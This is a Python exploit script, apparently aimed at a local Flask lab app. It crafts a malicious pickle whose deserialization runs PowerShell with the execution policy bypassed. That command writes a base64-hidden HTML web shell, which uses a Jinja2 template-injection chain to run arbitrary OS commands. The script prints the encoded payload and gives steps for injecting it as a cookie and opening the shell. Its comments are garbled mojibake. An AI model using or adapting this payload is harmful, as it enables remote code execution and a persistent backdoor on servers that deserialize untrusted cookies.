import pickle
import base64
import os


class Backdoor_Payload:
    def __reduce__(self):
        # 1. 转 -Web Shell (拽 )
        shell_content = """
        <html>
        <body style="background:black; color:#0f0; font-family:monospace;">
            <h1> WEB SHELL BACKDOOR </h1>
            <form>
                CMD: <input type="text" name="cmd" size="50" autofocus>
                <input type="submit" value="Execute">
            </form>
            <pre>
            {% if request.args.get('cmd') %}
                {{ config.__class__.__init__.__globals__['os'].popen(request.args.get('cmd')).read() }}
            {% endif %}
            </pre>
        </body>
        </html>
        """

        # 2. 专 -Base64 ( 注专 转  爪专 拽)
        #  拽 转  转 住拽专驻  砖  驻拽
        b64_bytes = base64.b64encode(shell_content.encode('utf-8'))
        b64_str = b64_bytes.decode('utf-8')

        # 3. 驻拽转 PowerShell 专专转
        # 驻拽 专转: "拽 转 专转 爪驻转 , 驻注 转, 转砖专 拽抓 shell.html"
        # 砖砖 -[IO.File]  拽  注拽祝 专砖转 专转 驻注
        ps_command = f"[IO.File]::WriteAllBytes('shell.html', [Convert]::FromBase64String('{b64_str}'))"

        # 转 驻拽  注专转 驻注
        cmd = f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{ps_command}"'

        return (os.system, (cmd,))


def generate_backdoor():
    payload = Backdoor_Payload()
    serialized = pickle.dumps(payload)
    encoded = base64.b64encode(serialized).decode()

    print(f"\n[+] POWERSHELL BACKDOOR PAYLOAD:\n")
    print(encoded)
    print("\n[!] INSTRUCTIONS:")
    print("1. Inject cookie -> Refresh HOME PAGE.")
    print("2. Look at your folder - 'shell.html' should pop up instantly.")
    print("3. Go to: http://127.0.0.1:5000/page/shell.html")


if __name__ == '__main__':
    generate_backdoor()